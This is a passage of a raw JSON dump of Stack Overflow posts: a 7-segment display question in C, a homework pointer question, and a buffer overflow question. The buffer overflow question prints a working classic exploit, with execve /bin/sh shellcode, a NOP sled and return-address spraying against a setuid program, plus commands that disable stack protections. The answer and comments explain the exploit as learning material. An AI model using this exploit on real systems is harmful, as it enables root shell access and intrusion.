MAX_DIGITS 10\r\n\r\nvoid clear_digits_array(void);\r\nvoid process_digit(int digit, int position);\r\nvoid print_digits_array(void);\r\nchar digits[3][MAX_DIGITS*4];\r\nconst int array[MAX_DIGITS][7]={{1,1,1,0,1,1,1},{0,0,1,0,0,1,0},{1,0,1,1,1,0,1},{1,0,1,1,0,1,1},{0,1,1,1,0,1,0},{1,1,0,1,0,1,1},{1,1,0,1,1,1,1},{1,0,1,0,0,1,0},{1,1,1,1,1,1,1},{1,1,1,1,0,1,1},};\r\n\r\n\r\n\r\nvoid clear_digits_array(void){\r\n    int j=0,i=0;\r\n    for(i=0;i&lt;3;i++){\r\n        for(j=0;j&lt;MAX_DIGITS*4;j++){\r\n            digits[i][j]=' ';\r\n        }\r\n    }\r\n}\r\n\r\nvoid process_digit(int digit, int position){\r\n    int i=0;\r\n    for(i=0;i&lt;7;i++){\r\n        if(array[digit][i]==1){\r\n            switch(i){\r\n                case 0: digits[0][1+position*4]='_';\r\n                    break;\r\n                case 1: digits[1][0+position*4]='|';\r\n                    break;\r\n                case 2: digits[1][2+position*4]='|';\r\n                    break;\r\n                case 3: digits[1][1+position*4]='_';\r\n                    break;\r\n                case 4: digits[2][0+position*4]='|';\r\n                    break;\r\n                case 5: digits[2][2+position*4]='|';\r\n                    break;\r\n                case 6: digits[2][1+position*4]='_';\r\n                    break;\r\n            }\r\n        }\r\n        \r\n    }\r\n}\r\nvoid print_digits_array(void){\r\n    int a=0,b=0;\r\n    for(a=0;a&lt;3;a++){\r\n        for(b=0;b&lt;MAX_DIGITS*4;b++)\r\n            printf(\"%c\",digits[a][b]);\r\n        printf(\"\\n\");\r\n    }\r\n    printf(\"\\n\");\r\n}\r\nint main(void) {\r\n    char character_number='\\0';\r\n    int a=0;\r\n    \r\n    clear_digits_array();\r\n    printf(\"Enter a number:\");\r\n    while ((character_number=getchar())!='\\n') {\r\n        int number=MAX_DIGITS;\r\n        switch(character_number){\r\n            case '0': number=0;\r\n                break;\r\n            case '1': number=1;\r\n                break;\r\n            case '2': number=2;\r\n                break;\r\n            case '3': number=3;\r\n                break;\r\n            case '4': number=4;\r\n                break;\r\n            case '5': number=5;\r\n                break;\r\n            case '6': number=6;\r\n                break;\r\n            case '7': number=7;\r\n                break;\r\n            case '8': number=8;\r\n                break;\r\n            case '9': number=9;\r\n                break;\r\n            default: number=' ';\r\n        }\r\n        if(a&lt;MAX_DIGITS){\r\n            process_digit(number,a);\r\n            a++;\r\n        }\r\n    }\r\n    print_digits_array();\r\n    return 0;\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 115, "user_id": 4518739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9d0795fd079fc7a67deebf9d05413c3?s=128&d=identicon&r=PG&f=1", "display_name": "Senglish", "link": "https://stackoverflow.com/users/4518739/senglish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2772, "favorite_count": 0, "accepted_answer_id": 33151931, "answer_count": 2, "score": 4, "last_activity_date": 1444921140, "creation_date": 1444864038, "last_edit_date": 1444869938, "question_id": 33137164, "link": "https://stackoverflow.com/questions/33137164/7-segment-display-with-printf-and-multidimensional-array-in-c", "title": "7-Segment display with printf and multidimensional array in C", "body": "<p>So my problem lies with my process_digit function I believe. The cases I don't think are indexing properly through each iteration of the 1's and 0's and so when I type in an input such as 4 i get an incorrect output. I'm not sure if the case\nstatements are backwards or what's happening but essentially I think they are not correct.</p>\n\n<pre><code>//input is 1 2 3 4 5 6 7 8 9 0\n//output should be        _   _        _   _   _   _   _   _\n//                     |  _|  _|  |_| |_  |_    | |_| |_| | |\n//                     | |_   _|    |  _| |_|   | |_|   | |_|\n//output is              _    _        _   _    _  _    _   _\n//                     | _|   _|  |_|  |_  |_   |  |_|  |_| ||\n//                     | |_   _|  |    _|  |_|  |  |_|  _|  |_|\n//\n</code></pre>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>#include &lt;stdio.h&gt;\r\n#define MAX_DIGITS 10\r\n\r\nvoid clear_digits_array(void);\r\nvoid process_digit(int digit, int position);\r\nvoid print_digits_array(void);\r\nchar digits[3][MAX_DIGITS*4];\r\nconst int array[MAX_DIGITS][7]={{1,1,1,0,1,1,1},{0,0,1,0,0,1,0},{1,0,1,1,1,0,1},{1,0,1,1,0,1,1},{0,1,1,1,0,1,0},{1,1,0,1,0,1,1},{1,1,0,1,1,1,1},{1,0,1,0,0,1,0},{1,1,1,1,1,1,1},{1,1,1,1,0,1,1},};\r\n\r\n\r\nvoid clear_digits_array(void){\r\n    int j=0,i=0;\r\n    for(i=0;i&lt;3;i++){\r\n        for(j=0;j&lt;MAX_DIGITS*4;j++){\r\n            digits[i][j]='\\0';\r\n        }\r\n    }\r\n}\r\n\r\nvoid process_digit(int digit, int position){\r\n    int i=0;\r\n    for(i=0;i&lt;7;i++){\r\n        if(array[digit][i]==1){\r\n            switch(i){\r\n                case 0: digits[0][1+position*4]='_';\r\n                    break;\r\n                case 1: digits[1][0+position*4]='|';\r\n                    break;\r\n                case 2: digits[1][2+position*4]='|';\r\n                    break;\r\n                case 3: digits[1][1+position*4]='_';\r\n                    break;\r\n                case 4: digits[2][0+position*4]='|';\r\n                    break;\r\n                case 5: digits[2][2+position*4]='|';\r\n                    break;\r\n                case 6: digits[2][1+position*4]='_';\r\n                    break;\r\n            }\r\n        }\r\n    }\r\n}\r\nvoid print_digits_array(void){\r\n    int a=0,b=0;\r\n    printf(\"                                                                                       \");\r\n    for(a=0;a&lt;3;a++){\r\n        printf(\"                                                                                       \");\r\n        for(b=0;b&lt;MAX_DIGITS*4;b++)\r\n            printf(\"%c\",digits[a][b]);\r\n        printf(\"                                                                                       \");\r\n    }\r\n    printf(\"                                                                                       \");\r\n}\r\nint main(void) {\r\n    char character_number='\\0';\r\n    int a=0;\r\n    \r\n    clear_digits_array();\r\n    printf(\"Enter a number:\");\r\n    while ((character_number=getchar())!='\\n') {\r\n        int number=MAX_DIGITS;\r\n        switch(character_number){\r\n            case '0': number=0;\r\n                break;\r\n            case '1': number=1;\r\n                break;\r\n            case '2': number=2;\r\n                break;\r\n            case '3': number=3;\r\n                break;\r\n            case '4': number=4;\r\n                break;\r\n            case '5': number=5;\r\n                break;\r\n            case '6': number=6;\r\n                break;\r\n            case '7': number=7;\r\n                break;\r\n            case '8': number=8;\r\n                break;\r\n            case '9': number=9;\r\n                break;\r\n            default: printf(\"%c ignored\", character_number);\r\n        }\r\n        if(a==0){\r\n            process_digit(number,a);\r\n            a++;\r\n        }\r\n    }\r\n    print_digits_array();\r\n    return 0;\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["c", "buffer", "overflow"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444862984, "post_id": 33136811, "comment_id": 54085445, "body": "Multiple questions in one, unclear, too broad and potential malware.  This down/close vote is just too easy."}, {"owner": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444863086, "post_id": 33136811, "comment_id": 54085500, "body": "Potential malware?  Anyway, I edited the post @MartinJames.  Please help me improve the post further, if it needs it."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444865302, "post_id": 33137185, "comment_id": 54086189, "body": "Could you clarify -- You said that the code repeats itself a few hundred times.  From what I can tell, the shellcode is only placed in the buffer once, and a return address is stored a couple hundred times.  Does this imply that the return address being written to the buffer in test.c is supposed to point to somewhere in the shell code?"}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "reply_to_user": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444865608, "post_id": 33137185, "comment_id": 54086271, "body": "Correct.  The point is to overwrite the return address with the (guessed) address of the shell code, so that, on return, the program will run the shell code instead of resuming from whete the call was made.  However, it doesn\u2019t know exactly where the return address or the shell code are."}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "reply_to_user": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444865703, "post_id": 33137185, "comment_id": 54086286, "body": "Oh, and buffer sizes that aren\u2019t multiples of 4 don\u2019t work here because the 4-byte return addresses don\u2019t come out aligned."}, {"owner": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444865778, "post_id": 33137185, "comment_id": 54086302, "body": "The address of the shell code shouldn&#39;t have to be guessed though, I would think, since we know where we are placing it in the buffer.  Also, I would like to state that your post has been helpful to me, but I think you may have been writing your answer while I edited the main post to focus on one question (which is now at the top of my post)."}, {"owner": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444865881, "post_id": 33137185, "comment_id": 54086327, "body": "I see your comment about buffer sizes needing to be multiples of 4.  However, this same code  does not work for, say, buffer[32]"}, {"owner": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444866284, "post_id": 33137185, "comment_id": 54086422, "body": "I should say, it seg faults for a size buffer[48].  It works fine for buffer[32].  I don&#39;t understand why it seg faults -- shouldn&#39;t the return address of bof() still be overwritten?"}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "reply_to_user": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "edited": false, "score": 0, "creation_date": 1444868331, "post_id": 33137185, "comment_id": 54086952, "body": "Run in a debugger and see where it tries to return to.  Disassemble and see what\u2019s on the stack frame.  I\u2019m not sure exactly what happens on your system, but you only have about a hundred bytes\u2019 leeway of NOPs, so it\u2019s possible your stack got so large, your shellcode now starts before your return address and you\u2019re calling garbage."}], "tags": [], "owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "is_accepted": true, "score": 1, "last_activity_date": 1444864161, "creation_date": 1444864161, "answer_id": 33137185, "question_id": 33136811, "link": "https://stackoverflow.com/questions/33136811/c-buffer-overflow-details/33137185#33137185", "title": "C - Buffer Overflow Details", "body": "<p>Keep in mind that, in a 32-bit x86 program such as this, the bytes on top of the stack hold, from lowest address on up: local variables, the return address of the function, its parameters, any registers saved by the caller, the caller\u2019s local variables, etc.</p>\n\n<p>The loop is actually writing 348 bytes worth of four-byte return addresses to the top of the stack.  (It predated C99 and x86_64 and therefore assumed that <code>long</code> is exactly 32 bits.)   The purpose of this is just to ensure that, for any plausible amount of storage for local variables, the return address will get overwritten.  It also tries to handle the case where the function with the vulnerability gets called from several levels deep and the top of the stack is no longer the same.  Then there\u2019s some padding with <code>nop</code> instructions, because if the function return lands anywhere in there, the CPU will just skip them.  Finally, there\u2019s the shell code, in machine language.  The whole point is to get the return address to point anywhere in this part of the buffer.  Note that this will only work if the exploit code can be sure that the address of the stack pointer in the caller\u2019s address space is similar.  Address-space randomization is a technique to defeat this.</p>\n\n<p>In other words, the code repeats itself a few hundred times because stuff might not be at exactly the same place in a new process, and this way, it still works if the stack pointer is anywhere close to where it expects.  The values are ballpark figures, but Aleph One talks about how to find them.</p>\n"}], "owner": {"reputation": 11, "user_id": 5447103, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b22a45fad1831a71d2f7a3d02a083451?s=128&d=identicon&r=PG&f=1", "display_name": "binker", "link": "https://stackoverflow.com/users/5447103/binker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 854, "favorite_count": 1, "accepted_answer_id": 33137185, "answer_count": 1, "score": 0, "last_activity_date": 1444866348, "creation_date": 1444862202, "last_edit_date": 1444866348, "question_id": 33136811, "link": "https://stackoverflow.com/questions/33136811/c-buffer-overflow-details", "title": "C - Buffer Overflow Details", "body": "<p>This particular problem has been addressed a few times here on stackoverflow, but I cannot find any previous post that addresses some questions that I have.  I would like to note that I have read Aleph One's \"Smashing the Stack for Fun and Profit\", but there are still gaps in my understanding.</p>\n\n<p>My question is:  This works (spawns a root shell) for various buffer sizes of <strong>stack.c</strong> in bof() from <code>buffer[12]</code> to <code>buffer[24]</code>.  Why does it not work (seg fault) for <code>buffer[48]</code> (which results in a seg fault), for example (or, how would the program need to be modified to make it work for such buffers)?</p>\n\n<p>Please note that the following commands are used when compiling stack.c</p>\n\n<pre><code># gcc -o stack -z execstack -fno-stack-protector stack.c\n# chmod 4755 stack\n</code></pre>\n\n<p>And ASLR is OFF.</p>\n\n<p>First, let's look at the vulnerable program:\n<strong>stack.c</strong></p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint bof(char *str)\n{\n    char buffer[12];\n    strcpy(buffer, str);\n\n    return 1;\n}\n\nint main(int argc, char **argv)\n{\n    char str[517];\n    FILE *badfile;\n\n    badfile = fopen(\"badfile\", \"r\");\n    fread(str, sizeof(char), 517, badfile);\n    bof(str);\n    printf(\"Returned Properly\\n\");\n    return 1;\n}\n</code></pre>\n\n<p>And the program to exploit this:  <strong>test.c</strong></p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n// code to spawn a shell\nchar shellcode[] =\n\"\\x31\\xc0\"\n\"\\x50\"\n\"\\x68\"\"//sh\"\n\"\\x68\"\"/bin\"\n\"\\x89\\xe3\"\n\"\\x50\"\n\"\\x53\"\n\"\\x89\\xe1\"\n\"\\x99\"\n\"\\xb0\\x0b\"\n\"\\xcd\\x80\"\n;\n\nunsigned long get_sp(void)\n{\n    __asm__(\"movl %esp, %eax\");\n}\nvoid main(int argc, char **argv)\n{\n    FILE *badfile;\n    char *ptr;\n    long *a_ptr;\n    long *ret;\n\n    int offset = 450;\n    int bsize = 517;\n\n    char buffer[bsize];\n\n    // a_ptr will store the return address\n    ptr = buffer;\n    a_ptr = (long *) ptr;\n\n    /* Initialize buffer with 0x90 (NOP instruction) */\n    memset(&amp;buffer, 0x90, bsize);\n\n    /* Fill buffer with appropriate contents */\n    printf(\"Stack Pointer (ESP): 0x%x\\n\", get_sp());\n\n    ret = get_sp() + offset;\n    printf(\"Address: 0x%x\\n\", ret);\n\n    int i;\n    for (i = 0; i &lt; 350; i += 4)\n        *(a_ptr++) = ret;\n\n    for (i = 450; i &lt; sizeof(shellcode) + 450; i++)\n        buffer[i] = shellcode[i-450];\n\n    buffer[bsize - 1] = '\\0';\n    /*Save the contents to the file \"badfile\" */\n    badfile = fopen(\"./badfile\", \"w\");\n    fwrite(buffer, 517, 1, badfile);\n    fclose(badfile);\n}\n</code></pre>\n\n<p>Below I will try to explain what I think is going on, and jot down notes as to where I believe the gaps in my knowledge are.  If anyone has time to go over this as well as answer the question as stated earlier, then thank you.</p>\n\n<p>Clearly, the <code>buffer[12]</code> in <strong>stack.c</strong> is going to be overflowed when strcpy() is called, because a string of size 517 is being copied into a buffer of size 12.</p>\n\n<p>In <strong>test.c</strong>, I understand that we are creating the malicious buffer which is to be read by <strong>stack.c</strong>.  This buffer is initialized with a bunch of NO-OP's (0x90).  Beyond that, I am a bit confused.</p>\n\n<p>1)  What is the point of the offset being added to ret in <code>ret = get_sp() + offset;</code>?  Also, why is <code>offset = 450</code>?  I have tried other values for the offset and this program has still run (such as 460).  450 seems like a guess that happens to work.</p>\n\n<p>2)  At <code>for (i = 0; i &lt; 350; i += 4)</code>, why is 350 used?  I don't understand the point of this value.  I believe that this loop is filling the first 350 bytes of the buffer with the return address <code>ret</code>, but I do not understand why it is 350 bytes.  I believe that we are increasing i by 4 each time because (long *) is 4 bytes.  If this is true, shouldn't this 350 also be a multiple of 4?</p>\n\n<p>3) Again, at <code>for (i = 450; i &lt; sizeof(shellcode) + 450; i++)</code> (sizeof(shellcode) is 25), why do we start at 450 in the buffer?  This is saying we are filling buffer[450] to buffer[475] with the shell code.  Currently, everything after that should be initialized to a NO-OP.    So what?  Why 450 - 475?</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1444861961, "post_id": 33136730, "comment_id": 54085015, "body": "Every answer you&#39;ve given that is greater than 250 is incorrect.  They <i>might</i> be correct if you include a <code>0x</code> prefix, indicating they are hexadecimal values."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1444862024, "post_id": 33136730, "comment_id": 54085041, "body": "Homework questions are allowed if you show your own effort and where you are stuck.  People are more likely to give hints than solutions to homework to encourage learning."}, {"owner": {"reputation": 353, "user_id": 1448063, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/bfb70f66f743c5322975f9c269771796?s=128&d=identicon&r=PG", "display_name": "JPHamlett", "link": "https://stackoverflow.com/users/1448063/jphamlett"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1444862033, "post_id": 33136730, "comment_id": 54085048, "body": "@JonathonReinhart How are they wrong?"}, {"owner": {"reputation": 153402, "user_id": 1204143, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/5ca341b160687d99b1317859f91054ee?s=128&d=identicon&r=PG", "display_name": "nneonneo", "link": "https://stackoverflow.com/users/1204143/nneonneo"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 3, "creation_date": 1444862040, "post_id": 33136730, "comment_id": 54085050, "body": "@JonathonReinhart: Actually, since <code>printf</code> is using <code>%x</code>, this is what you&#39;d see from the console."}, {"owner": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "edited": false, "score": 0, "creation_date": 1444862071, "post_id": 33136730, "comment_id": 54085065, "body": "If you dump a homework question without minimal effort to found the answer, no, it&#39;s not allowed."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1444862078, "post_id": 33136730, "comment_id": 54085069, "body": "@JPHamlett: He means you need to prefix 0x :-)"}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "reply_to_user": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "edited": false, "score": 0, "creation_date": 1444862103, "post_id": 33136730, "comment_id": 54085080, "body": "@ouah: He presents what he things are the answer.  It&#39;s OK."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "reply_to_user": {"reputation": 153402, "user_id": 1204143, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/5ca341b160687d99b1317859f91054ee?s=128&d=identicon&r=PG", "display_name": "nneonneo", "link": "https://stackoverflow.com/users/1204143/nneonneo"}, "edited": false, "score": 0, "creation_date": 1444862108, "post_id": 33136730, "comment_id": 54085081, "body": "@nneonneo Doh! Good call. Stupid teacher forgot the &quot;0x&quot; :-)"}, {"owner": {"reputation": 153402, "user_id": 1204143, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/5ca341b160687d99b1317859f91054ee?s=128&d=identicon&r=PG", "display_name": "nneonneo", "link": "https://stackoverflow.com/users/1204143/nneonneo"}, "edited": false, "score": 2, "creation_date": 1444862179, "post_id": 33136730, "comment_id": 54085109, "body": "@JPHamlett: All but one of your answers is wrong, as far as I can tell. I would go over the sequence of steps more carefully. Hint: as a first pass, just allocate the variable addresses just so you know where everything is."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1444862192, "post_id": 33136730, "comment_id": 54085113, "body": "I think we&#39;re also supposed to assume that <code>sizeof(void*) == sizeof(int) == 2</code>."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1444862222, "post_id": 33136730, "comment_id": 54085123, "body": "@JonathonReinhart: Yes 16 bit systems have typically had 16 bit pointers."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444862243, "post_id": 33136730, "comment_id": 54085128, "body": "I&#39;m voting to close this question as off-topic because homework marking."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 3, "creation_date": 1444862251, "post_id": 33136730, "comment_id": 54085132, "body": "I don&#39;t think any of them are correct except f."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1444862418, "post_id": 33136730, "comment_id": 54085194, "body": "Agree with @kaylum.  I totally missed that the 30 and 50 are assigned as decimal but printed as hex.  Also intuitively but incorrectly allocated space for a return address when initially thinking the first two were correct :-)"}, {"owner": {"reputation": 353, "user_id": 1448063, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/bfb70f66f743c5322975f9c269771796?s=128&d=identicon&r=PG", "display_name": "JPHamlett", "link": "https://stackoverflow.com/users/1448063/jphamlett"}, "reply_to_user": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1444862441, "post_id": 33136730, "comment_id": 54085206, "body": "@EricJ. Would the first variable be assigned to 0x250 or 0x252?"}, {"owner": {"reputation": 17343, "user_id": 445976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c82b2b9bdcf1baaf4677238d59cf745f?s=128&d=identicon&r=PG", "display_name": "Blastfurnace", "link": "https://stackoverflow.com/users/445976/blastfurnace"}, "edited": false, "score": 0, "creation_date": 1444862447, "post_id": 33136730, "comment_id": 54085211, "body": "@JPHamlett: You can solve this with paper and pencil. Write all your variables, their addresses and values and manually perform each line of code."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1444862474, "post_id": 33136730, "comment_id": 54085227, "body": "@JPHamlett: <code>Assume that variables are placed in memory contiguously in the order they are coded, starting at memory address 0x250</code>"}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444862642, "post_id": 33136730, "comment_id": 54085297, "body": "@MartinJames: Homework questions (that don&#39;t just dump the assignment) are allowed.  OP shows effort <a href=\"http://meta.stackoverflow.com/a/286643/141172\">meta.stackoverflow.com/a/286643/141172</a>"}], "answers": [{"comments": [{"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1444862683, "post_id": 33136891, "comment_id": 54085321, "body": "Also, OP be careful about what is a decimal value and what is a hex value."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1444862881, "post_id": 33136891, "comment_id": 54085396, "body": "Directed at OP.  Edited my previous comment for clarity."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": 